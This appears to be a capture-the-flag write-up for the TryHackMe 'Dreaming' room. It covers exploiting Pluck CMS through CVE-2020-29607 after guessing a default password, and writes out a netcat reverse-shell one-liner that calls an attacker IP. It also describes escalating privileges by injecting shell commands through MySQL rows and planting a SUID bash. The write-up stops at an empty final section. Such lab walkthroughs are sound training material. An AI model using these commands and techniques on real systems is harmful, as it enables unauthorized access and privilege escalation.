![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/7fb15d84-688a-4f2d-9874-1b785fc1456c)# THM-Dreaming
![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5997701d-4379-41d2-b2bc-e2f97f37c4f4)



Personal attempt on THM CTF Challenge. [DREAMING](https://tryhackme.com/room/dreaming))

RECON 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/084772cd-94f9-46ba-b317-6d805eaa61e6)

Access the target's website, we can only see Apache's default site. Let's do some directory enumeration with nmap and http-enum script. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/016a5d24-38de-470c-8170-120b0a79eab5)

Accessing the directoy, we know that the web is using Pluck CMS 4.7.13

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/48925c1d-2d60-4869-903a-3c3c75efb00a)

EXPLOIT

Upon a quick Google search, we can tell that this version of Pluck is vulnerable to an Authenticated File Upload, as documented in CVE-2020-29607. However, first we need to authenticate. 
With some luck, I was able to guess the password. It's password (not very secured 🔒)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/944c85b0-9e3d-4599-aeaa-10cd9273ee47)

The mentioned vulnerability allows an attacker to upload a web shell to the directory http://IP/admin.php?action=files to gain a webshell. This abuses the "manage files" functionality of the app.
I use this PoC from Github: https://github.com/0xAbbarhSF/CVE-2020-29607
Usage: python3 exploit.py TARGET IP TARGET PORT password pluck-cms-path

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5b4795d2-805a-4e65-b5ba-a046e22eeafc)

Now, for more control and convenience, we want a reverse shell. I personally like to use the methods from
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

On your attack machine, start a Netcat listener on a random unused port.
nc -lvnp 1234

Then run this on the webshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
Remember to replace the IP with the IP of your attack machine. 

Wait a few a moment, then we receive a shell of the target machine as www-data. www-data is the owner of files under the web server directory.  

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/325565e4-6740-4f61-be04-977d00d318bb)

To gain a more stable shell, we can use the command:
python3 -c 'import pty;pty.spawn("/bin/bash")

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/d7cd8071-55ff-47ed-b56e-42da593972ef)

PRIVILEGE ESCALATION


![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5e59087c-b25e-49f9-97dd-7ad1978fe37c)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/07a3dbb9-dee1-4bae-aaf0-164eac7ab22e)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/eac83ba7-0d52-4a95-aa16-d7d46a750ad8)

As you can see, www-data don't have read access to the flags so, in order to get the flags, we need to find ways to escalate to higher privileges. I am using [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)

To transfer it to the target machine, we can use the manage files nav bar (under Pages). Then script will be available at /var/www/html/files/linpeas.sh

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/05e6436c-6894-4ba0-b302-fee782a6f0be)


![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6b71812c-f6a9-4f57-a5fc-2278f753f47d)

Thanks to LinPEAS, we find some interesting files: 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6506e51b-dce4-4049-bf7b-ff6baf43a8f5)

LUCIEN
Opening the test.py, we found Lucien password

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/b131a147-6ccb-4ea0-9b44-329fd18df755)

We can now SSH to the target using lucien's credential. The flag is found under his home directory.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/49d3c69a-2c2d-4440-af22-a8cd8775df65)

DEATH
Using **sudo -l**, we see that Lucien can run a Python script as Death. It is know our job how to exploit this script to gain Death's shell

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6bdd772a-4e5b-491d-b8de-cb39119fa926)

The script in /opt seems to be identical with the script that we're going to exploit. However, we only have read acess, so let's skim its content to see what it does. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/7cbf69a6-ebaa-48fa-89a3-555fccee0317)

First, a connection to the local mySQL database named 'library' was made. We can also see credentials of death, but the password was redacted.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/339f952f-77c0-4721-97ad-69240cbbe5c2)

Then the script fetches information from the 'dream' and the 'dreamer' column of the 'dreams' table.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5667a4d8-9866-4a42-88c2-4d4c7aeeb237)

Finally, it echos a string concatenating the values. We can abuse this to inject shell commands into the database and get the executed under death. 


Opening .bash_history in lucien's home directory. We found lucien's mysql password. 
mysql -u lucien -p????????????????

Using lucien's credential we were able to login. 
Here's the content of the 'dreams' table:
![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/577970a3-0247-4a98-8d48-9485d01fa63c)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/c4fbcb5d-af7b-423c-96f7-cff091c397af)

Using the ';' character, I was able to chain the echo command with the cat command to view death's flag. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/44be4445-b81b-4344-a53e-7a03fbe926ba)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/2e5c2e0f-2a5a-4ba1-9f81-1630a8eb4c0d)

Still, we still haven't gained death's shell. To do that, we copy /bin/bash to /tmp/bash and add a SUID bit. Therefore, we will have access to death's shell. 

Return to MySQL, and injects the command. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/0f511983-4f1c-4f31-96c4-25fffc2f9690)

Run the script again, and we have death's shell.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/7f0500c8-6526-494e-aa38-734b3e016262)

Remember the redacted password in getDreams.py in death's home dir? We can view it now. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/ee85ccc9-c82b-4774-86a5-243bde038271)

Luckily, we can reuse the DB password to ssh to the target for more stable shell. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/bf278b4e-12f3-4d9b-884b-f9b40f5f76c7)




MORPHEUS














